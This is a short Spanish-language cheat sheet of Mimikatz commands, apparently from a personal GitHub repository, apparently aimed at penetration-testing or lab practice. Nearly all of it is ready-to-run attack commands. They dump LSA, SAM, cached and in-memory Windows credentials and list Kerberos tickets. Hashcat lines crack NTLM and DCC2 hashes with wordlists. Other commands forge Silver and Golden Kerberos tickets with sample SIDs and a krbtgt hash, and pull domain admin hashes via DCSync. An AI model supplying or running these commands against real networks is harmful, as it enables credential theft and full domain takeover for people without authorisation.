# Mimikatz Cheat Sheet

#### Correr como Administrador
```
mimikatz# token::elevate
mimikatz# privilege::debug
```

#### Dumpear Hashes
```
mimikatz# lsadump::lsa /patch

hashcat -m 1000 <hash> rockyou.txt
```

#### Password dumping (Para todos los usuarios que iniciaron sesión en el equipo local) - Extraer contraseñas del sistema
```
mimikatz# sekurlsa::logonPasswords /full

Nota: Tener habilitado solamente el privilege::debug
```

#### Password en memoria
```
mimikatz# sekurlsa::tickets
```

#### sam dumping
```
mimikatz# lsadump::sam

Nota: Tener habilitado solamente el privilege::debug y token::elevate
```

#### secrets dumping
```
mimikatz# lsadump::secrets

Nota: Tener habilitado solamente el privilege::debug
```

#### cache dumping
```
mimikatz# lsadump::cache

El valor lo metemos en un archivo con el formato:
$DCC2$10240#USER#VALOR-MsCacheV2

Crackeamos:
hashcat -m 2100 hash-web_svc /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### Crear Silver Ticket (SPN)
```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:<HASH-NTM> /user:<ALGUN-USER-DEL-DOMAIN>

Luego validamos en Windows si esta el Silver ticket:
PS> klist
PS> iwr -UseDefaultCredentials http://web04
```

#### Crear Golden Ticket
```
kerberos::golden /user:Administrator /domain:<CHILD-DOMAIN>
/sid:<SID-CHILD-DOMAIN> /sids:<SID-DOMAIN>-<ID-USER> /krbtgt:<HASH-NT-KRBTGT> /ptt

kerberos::golden /user:Administrator /domain:child.redteam.corp
/sid:S-1-5-21-2332039752-785340267-2377082902 /sids:S-1-5-21-1882140339-3759710628-635303199-519 /krbtgt:24dd6646fd7e11b60b6a9508e6fe7e5a /ptt
``

#### Extraer hashes NTLM cuando el usuario tiene DCSync
```
privilege::debug

lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\administrator
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)